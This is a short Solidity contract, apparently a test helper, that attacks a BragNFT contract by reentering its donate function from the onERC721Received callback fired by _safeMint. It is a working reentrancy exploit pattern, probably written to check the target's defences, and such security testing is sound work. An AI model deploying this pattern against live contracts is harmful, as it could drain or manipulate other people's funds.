// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./BragNFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract ReentrantDonor is IERC721Receiver {
    BragNFT public bragNFT;

    constructor(address _bragNFT) {
        bragNFT = BragNFT(payable(_bragNFT));
    }

    function attack() external payable {
        bragNFT.donate{value: msg.value}("attack", "", false);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        // Re-enter 'donate' during Step 4 of _donate (_safeMint calls this)
        bragNFT.donate{value: 0.1 ether}("reenter", "", false);
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
